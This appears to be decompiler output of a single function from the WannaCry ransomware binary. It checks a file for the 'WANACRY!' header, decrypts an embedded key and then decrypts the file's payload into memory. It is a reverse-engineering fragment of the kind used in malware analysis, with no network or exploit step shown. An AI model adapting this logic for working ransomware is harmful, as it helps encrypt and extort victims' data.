
/* WARNING: Type propagation algorithm not settling */

byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2)

{
  byte *pbVar1;
  HANDLE hFile;
  int iVar2;
  byte *pbVar3;
  size_t local_248 [2];
  undefined1 local_240;
  undefined4 local_23f;
  undefined2 uStack_23b;
  undefined1 uStack_239;
  uint local_238;
  uint local_234;
  byte local_230 [512];
  size_t local_30;
  byte *local_2c;
  LARGE_INTEGER local_28;
  uint local_20 [3];
  void *local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &DAT_004081e0;
  puStack_10 = &DAT_004076f4;
  local_14 = ExceptionList;
  pbVar3 = (byte *)0x0;
  local_30 = 0;
  local_248[0] = 0;
  local_240 = 0;
  local_23f = 0;
  uStack_23b = 0;
  uStack_239 = 0;
  local_248[1] = 0;
  local_20[0] = 0;
  local_8 = 0;
  ExceptionList = &local_14;
  hFile = CreateFileA(param_1,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    GetFileSizeEx(hFile,&local_28);
    if ((local_28.s.HighPart < 1) && ((local_28.s.HighPart < 0 || (local_28.s.LowPart < 0x6400001)))
       ) {
      iVar2 = (*DAT_0040f880)(hFile,&local_240,8,local_20,0);
      if (iVar2 != 0) {
        iVar2 = memcmp(&local_240,s_WANACRY!_0040eb7c,8);
        if (iVar2 == 0) {
          iVar2 = (*DAT_0040f880)(hFile,local_248,4,local_20,0);
          if ((iVar2 != 0) && (local_248[0] == 0x100)) {
            iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),0x100,local_20,0);
            if (iVar2 != 0) {
              iVar2 = (*DAT_0040f880)(hFile,local_248 + 1,4,local_20,0);
              if (iVar2 != 0) {
                iVar2 = (*DAT_0040f880)(hFile,&local_238,8,local_20,0);
                if (((iVar2 != 0) && ((int)local_234 < 1)) &&
                   (((int)local_234 < 0 || (local_238 < 0x6400001)))) {
                  iVar2 = FUN_004019e1((void *)((int)this + 4),*(void **)((int)this + 0x4c8),
                                       local_248[0],local_230,&local_30);
                  if (iVar2 != 0) {
                    FUN_00402a76((void *)((int)this + 0x54),local_230,(uint *)PTR_DAT_0040f578,
                                 local_30,(byte *)0x10);
                    local_2c = (byte *)GlobalAlloc(0,local_238);
                    if (local_2c != (byte *)0x0) {
                      iVar2 = (*DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),
                                              local_28.s.LowPart,local_20,0);
                      pbVar1 = local_2c;
                      if (((iVar2 != 0) && (local_20[0] != 0)) &&
                         ((0x7fffffff < local_234 ||
                          (((int)local_234 < 1 && (local_238 <= local_20[0])))))) {
                        FUN_00403a77((void *)((int)this + 0x54),*(byte **)((int)this + 0x4c8),
                                     local_2c,local_20[0],1);
                        *param_2 = local_238;
                        pbVar3 = pbVar1;
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  local_unwind2(&local_14,0xffffffff);
  ExceptionList = local_14;
  return pbVar3;
}
